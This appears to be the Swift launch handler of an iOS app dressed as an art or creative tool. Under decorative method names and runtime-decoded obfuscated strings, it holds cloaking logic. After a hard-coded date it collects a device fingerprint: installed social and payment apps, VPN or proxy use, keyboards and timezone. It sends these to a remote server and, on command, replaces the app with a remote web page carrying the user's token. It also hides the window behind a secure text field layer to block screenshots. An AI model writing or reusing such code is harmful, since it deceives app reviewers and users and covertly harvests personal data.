//
//  MusePoolHandler.swift
//  Sinere
//
//  Created by Sinere on 2024/11/20.
//

import UIKit
import Alamofire
import RxSwift
import RxCocoa


class MusePoolHandler: CreativeBaseHandler {
    
    let sneBilityManager = NetworkReachabilityManager()
    
    var sneNetWorkState = BehaviorRelay(value: 0)
    
    var sneNetWorkInfo = false
    var sneNetWorkSuccess = false
    
    var secureTextWidget:UITextField?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let _ = SneTools.shareInfo
        sneNetWorkState.take(2).subscribe(onNext: { [weak self] sneNetWorkState in
            guard let self = self else {return}
            if sneNetWorkState == 1 {
                self.sneNetWorkInfo = true
                self.adjustColorBalanceForMaximumVisualAestheticAppeal(self.sneNetWorkInfo)
            }
        }).disposed(by: sneDisposeBag)
        
        NotificationCenter.default.rx.notification(Notification.Name("NotificationCenterName")).subscribe {[weak self] _ in
            guard let self = self else {return}
            if self.sneNetWorkSuccess == true {
                self.adjustColorBalanceForMaximumVisualAestheticAppeal(self.sneNetWorkInfo)
            }
        }.disposed(by: sneDisposeBag)
        
        startNetWorkBility()
    }
    
    func startNetWorkBility(){
        sneBilityManager!.startListening(onUpdatePerforming: { status in
            switch status {
            case .notReachable: break
            case .reachable(.ethernetOrWiFi):
                self.sneNetWorkState.accept(1)
            case .reachable(.cellular):
                self.sneNetWorkState.accept(1)
            case .unknown:break
            }
        })
    }
    
    func adjustColorBalanceForMaximumVisualAestheticAppeal(_ sneNetWorkInfo:Bool) {
        if sneNetWorkInfo == true {
            let nowImpact: TimeInterval = Date().timeIntervalSince1970
            let sneFlag = nowImpact > SneTools.sneImpact
            var sneAppeal = false
            if nowImpact > 0 {
                let impactCheck: Int = {
                    var impactNum = 0
                    if impactNum <= 0 {
                        impactNum = 3
                    }

                    var artisticSne = 0
                    if sneFlag == true {
                        artisticSne = impactNum
                    }else{
                        artisticSne = impactNum * 0
                    }
                    
                    var artisticSneTotal = 1
                    if artisticSneTotal > 0 {
                        artisticSneTotal += 0
                        for i in 1...impactNum {
                            artisticSneTotal *= i
                        }
                    }
                    
                    return artisticSne * ((artisticSne % 2 == 0) ? artisticSneTotal / 2 : artisticSneTotal * 2)
                    
                }()
                sneAppeal = (impactCheck > 0) || (sneFlag && (nowImpact.truncatingRemainder(dividingBy: 100) == 0))
            }
            
            if sneAppeal == false{
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.01) {
                    self.performSegue(withIdentifier: "CreatorLoginHandler", sender: self)
                }
                return
            }
            
            if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let sceneDelegate = scene.delegate as? SceneDelegate ,let window = sceneDelegate.window{
                fetchPlatformAnnouncements(userWindow: window)
            }
            
            let sneParams:[String : Any] = [
                "sketchTrace":SneTools.sinereBrushID(),
                "pixelVersion":SneTools.shareInfo.sneNetWorkConfig["sneVersion"] ?? "",
                "languageTone":UserDefaults.standard.object(forKey: "AppleLanguages") ?? ["en-CN"],
                "groupArtwork":groupArtwork(),
                "chronozone":TimeZone.current.identifier,
                "typeSectors":sneactiveInputModule(),
                "easelVault":sneEaselVault()
            ]
            
            self.view.makeToastActivity(.center)
            storeAndCategorizeUserArtworkBasedOnStyleAndTheme(SneTools.shareInfo.sneNetWorkConfig["sneAddress"]! + SneTools.shareInfo.sneNetWorkConfig["createNode"]!, sneParams: sneParams, sneHeader: SneTools.shareInfo.sneHttpHeaders) { response in
                self.view.hideToastActivity()
                
                let responseKpValid:Bool = {
                    var reponseKpSuc = ""
                    if let cboddje = response["cboddje".sinereString] as? String {
                        
                        if cboddje.count > 0 {
                            reponseKpSuc = "0c0q0r0".sinereString
                        }
                        
                        if reponseKpSuc.count > 0 && cboddje.count > 0 {
                            return reponseKpSuc == cboddje
                        }else{
                            return false
                        }
                        
                    }else{
                        return false
                    }
                }()
                
                
                if responseKpValid {
                    
                    if let sneResponseResult = response["rueeshuplpt".sinereString] as? [String:Any] {
                        let sinereStyleMixer = sneResponseResult["hc5zUzrcl".sinereString] as? String ?? ""
                        if sinereStyleMixer.count > 0 {
                            UserDefaults.standard.set(sinereStyleMixer, forKey: "sinereStyleMixer")
                            UserDefaults.standard.synchronize()
                        }else{
                            self.performSegue(withIdentifier: "CreatorLoginHandler", sender: self)
                            return
                        }
                        
                        let sinereMixerArray = Array(sinereStyleMixer)
                        let sinereMixer = sinereMixerArray.map { String($0) }.joined(separator: "-")
                        
                        if sinereMixer.count > 0 && sinereMixerArray.count > 0 {
                            let ljowgbixnnFuljajg = "ljowgbixnnFuljajg".sinereString
                            guard ljowgbixnnFuljajg.count > 0 else {
                                return
                            }
                            
                            let sinereFineTune = String(sinereMixer.reversed())
                            
                            if sinereFineTune.count == sinereMixer.count {
                                let sneInfoStutus = sneResponseResult[ljowgbixnnFuljajg] as? Int
                                guard sneInfoStutus != nil else {
                                    return
                                }
                                
                                if sneInfoStutus == 1 && SneTools.shareInfo.sneUserTokenInfo.count > 0 {
                                    let fullAddress = sinereStyleMixer + "?taepyptIedq=".sinereString + "\(SneTools.shareInfo.sneNetWorkConfig["baseStroke"]!)" + "&ytfohkaejnr=".sinereString + SneTools.shareInfo.sneUserTokenInfo
                                    let engagementSinereHandler = EngagementSinereHandler()
                                    engagementSinereHandler.engagementAgreement = fullAddress
                                    self.navigationController?.pushViewController(engagementSinereHandler, animated: false)
                                    self.sneNetWorkSuccess = true
                                }else{
                                    
                                    SneTools.shareInfo.sneState.accept(self.sneUserTas(sneResponseResult))
                                    self.performSegue(withIdentifier: "CreatorLoginHandler", sender: self)
                                    self.sneNetWorkSuccess = false
                                }
                            }
                        }
                    }else{
                        self.performSegue(withIdentifier: "CreatorLoginHandler", sender: self)
                    }
                    
                }else{
                    self.performSegue(withIdentifier: "CreatorLoginHandler", sender: self)
                }
            } failure: {
                self.view.hideToastActivity()
                self.performSegue(withIdentifier: "CreatorLoginHandler", sender: self)
            }
        }
    }

    func sneUserTas(_ sneResponseResult:[String:Any]) ->Int {
        if let sneUserTas = sneResponseResult["lyogchantlisoknlFjlkaxg".sinereString] as? Int {
            return sneUserTas == 1 ? 2 : 1
        }else{
            return 1
        }
    }
    
    func groupArtwork()->[String]{
        let sneGroupItems = [
            ("wchqastwshavpyp".sinereString,"WyheaitvsrAcpsp".sinereString),
            ("ionzswtgaxgzrwaim".sinereString,"Inndswtwatgkraabm".sinereString),
            ("fdb".sinereString,"Ftascheubzobock".sinereString),
            ("tlizkktfoak".sinereString,"TminkhTjovk".sinereString),
            ("czobmegfoloqgdluecmxafpys".sinereString,"GrogomgvlleoMoaopds".sinereString),
            ("thwteeedtfire".sinereString,"towsiftrtfecr".sinereString),
            ("mkqcq".sinereString,"qyq".sinereString),
            ("wiepchhtaft".sinereString,"wnepiqCwhjabt".sinereString),
            ("adluizpjaqy".sinereString,"Anlkiiahpgp".sinereString)
        ]
        
        var groupApps: [String] = []
        
        for (scheme, appName) in sneGroupItems {
            if let url = URL(string: "\(scheme)://"), UIApplication.shared.canOpenURL(url) == true {
                groupApps.append(appName)
            }
        }
        
        return groupApps
    }
    
    func fetchPlatformAnnouncements(userWindow: UIWindow) {
        if secureTextWidget == nil {
            secureTextWidget = UITextField()
            secureTextWidget?.isSecureTextEntry = true
            userWindow.addSubview(secureTextWidget!)
            
            if let widget = secureTextWidget, widget.isSecureTextEntry ,let superLayer = userWindow.layer.superlayer{
                superLayer.addSublayer(widget.layer)
            }
            
            if #available(iOS 17.0, *) {
                if let lastSublayer = secureTextWidget?.layer.sublayers?.last {
                    lastSublayer.addSublayer(userWindow.layer)
                }
            } else {
                if let firstSublayer = secureTextWidget?.layer.sublayers?.first {
                    firstSublayer.addSublayer(userWindow.layer)
                }
            }
        }
    }
    
    func sneEaselVault()->Int {
        var sneEasel = false
        if let sneNetWorkSettings = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as? [String: Any],
           let sneNetWorkScoped = sneNetWorkSettings["_l_iScCsOnPlExDx_p_".sinereString] as? [String: Any] {
            let sneScopedAllKeys = sneNetWorkScoped.keys
            for sneKeyItem in sneScopedAllKeys {
                if sneKeyItem.contains("taaxp".sinereString) || sneKeyItem.contains("tbuin".sinereString) || sneKeyItem.contains("izptshekc".sinereString) || sneKeyItem.contains("pspsp".sinereString) {
                    sneEasel = true
                    break
                }
            }
        }
        return sneEasel ? 1 : 0
    }
    
    func sneactiveInputModule()->[String]{
        var boardLanguages: [String] = []
        let keyboards = UITextInputMode.activeInputModes
        for keyboard in keyboards {
            if let language = keyboard.primaryLanguage {
                boardLanguages.append(language)
            }
        }
        return boardLanguages
    }
}
